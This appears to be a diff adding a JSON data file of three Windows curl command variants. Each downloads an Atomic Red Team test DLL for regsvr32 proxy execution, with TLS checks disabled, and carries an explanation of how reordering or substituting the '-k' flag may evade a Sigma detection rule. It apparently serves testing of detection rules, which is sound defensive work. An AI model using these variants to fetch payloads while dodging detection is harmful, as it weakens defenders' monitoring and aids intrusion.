@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Lab\\out\\allthethingsx64.dll",
+    "explanation": "Reordering: The '-k' flag is moved after the URL, which may not trigger the Sigma rule's regex that looks for '-k' before the URL."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Lab\\out\\allthethingsx64.dll -k",
+    "explanation": "Reordering: The '-k' flag is moved to the end of the command line, which may not trigger the Sigma rule's regex that looks for '-k' before the URL."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Lab\\out\\allthethingsx64.dll --insecure",
+    "explanation": "Substitution: Replaced '-k' with '--insecure' which is functionally equivalent but may not be detected by the Sigma rule that specifically looks for '-k'."
+  }
+]
